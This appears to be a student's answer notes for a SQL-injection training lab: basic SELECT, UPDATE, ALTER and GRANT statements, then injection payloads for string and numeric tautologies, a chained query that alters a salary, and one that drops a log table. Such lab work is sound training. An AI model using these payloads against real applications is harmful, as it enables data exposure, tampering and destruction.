
## I. Intro

### Introduction about SQL queries with sample dababases.


2. Retrieve the department of the employee Bob Franco with full privileges.
```
SELECT department FROM employees where first_name= 'Bob'`
```

3. Change the department of Tobi Barnett to 'Sales'.
```
UPDATE employees set department= 'Sales' WHERE first_name= 'Tobi'
```

4. Modify the schema by adding the column phone" (varchar(20)) to the table employees".
```
ALTER TABLE employees ADD phone varchar(20)
```

5. Grant rights to the table grant_rights to user unauthorized_user.
```
GRANT ALL ON grant_rights to unauthorized_user
```

9. String SQLI
```
SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1';
```

10. Numberic SQLI
```
SELECT * From user_data WHERE Login_Count = 1 and userid= 1 or 1=1
```

11. Compromising confidentiality with String SQL injection
```
SELECT * FROM employees WHERE last_name= '1' or 1=1--
```

12. Compromising Integrity with Query chaining
```
Employee Name: Smith
Authentication TAN: 3SL99A' OR 1=1; UPDATE employees SET salary= 999999999 WHERE USERID= 37648;--
```

13. Compromising Availability
```
';DROP TABLE access_log;--
```